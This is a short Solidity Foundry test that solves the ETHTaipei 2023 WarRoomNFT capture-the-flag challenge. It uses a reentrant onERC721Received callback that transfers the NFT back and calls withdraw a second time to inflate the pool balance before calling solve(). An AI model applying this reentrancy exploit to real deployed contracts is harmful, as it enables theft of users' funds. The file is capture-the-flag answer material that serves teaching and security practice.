// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {Pool, PoolBase} from "../../src/ETHTaipei2023/ETHTaipeiWarRoomNFT/Pool.sol";
import {WarRoomNFT} from "../../src/ETHTaipei2023/ETHTaipeiWarRoomNFT/NFT.sol";

contract PoolTest is Test {
    Pool public pool;
    WarRoomNFT public nft;
    PoolBase public base;
    uint256 times = 0;

    function setUp() public {
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;
        base = new PoolBase(startTime, endTime, fullScore);
        base.setup();
    }

    function testExploit_pool() public {
        nft = base.nft();
        pool = base.pool();
        uint256 tokenId = base.tokenId();
        nft.approve(address(pool), tokenId);
        pool.deposit(tokenId);
        pool.withdraw(tokenId);
        console.log(pool._balances(address(this)));
        base.solve();
        assertTrue(base.isSolved());
    }

    function onERC721Received(address, address, uint256 tokenId, bytes memory) external returns (bytes4) {
        if (times < 1) {
            times++;
            nft.safeTransferFrom(address(this), address(pool), 1);
            pool.withdraw(tokenId);
        }
        return this.onERC721Received.selector;
    }
}
